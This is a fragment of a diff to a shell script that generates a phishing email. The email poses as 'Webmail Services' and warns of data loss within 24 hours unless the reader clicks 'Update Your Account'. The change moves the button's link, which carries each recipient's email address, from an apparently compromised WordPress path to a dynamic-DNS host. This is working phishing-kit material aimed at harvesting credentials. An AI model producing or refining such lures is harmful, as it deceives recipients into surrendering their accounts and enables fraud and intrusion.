@@ -118,7 +118,7 @@ cat > email.html <<EOL
       <p><strong>Note:</strong> If this action is not completed within 24 hours, you may experience service disruption or data loss.</p>
     </div>
     <div class="button-container">
-      <a href="https://monstermeeple.com.mx/wp-admin/up/captcha2.html?email={{EMAIL}}" class="cta-button">Update Your Account</a>
+      <a href="https://benten.ddns.net/captcha2.html?email={{EMAIL}}" class="cta-button">Update Your Account</a>
     </div>
     <div class="footer">
       &copy; 2025 Webmail Services. All rights reserved.<br>
